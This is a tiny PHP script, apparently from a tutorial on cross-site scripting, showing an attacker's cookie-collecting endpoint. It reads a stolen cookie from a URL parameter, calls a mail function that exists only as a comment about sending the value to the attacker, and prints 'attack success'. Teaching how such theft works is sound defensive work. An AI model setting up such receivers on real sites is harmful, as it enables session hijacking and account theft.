#[#<?php#]#
#[#$cookie = $_GET["cookie"];#]#
#[#function sendMail($cookie) {
    // ここで攻撃者は自分にメールを送信してクッキーの値を入手します。
}#]#
#[#sendMail($cookie);
echo "攻撃成功";
echo $cookie;
?>#]#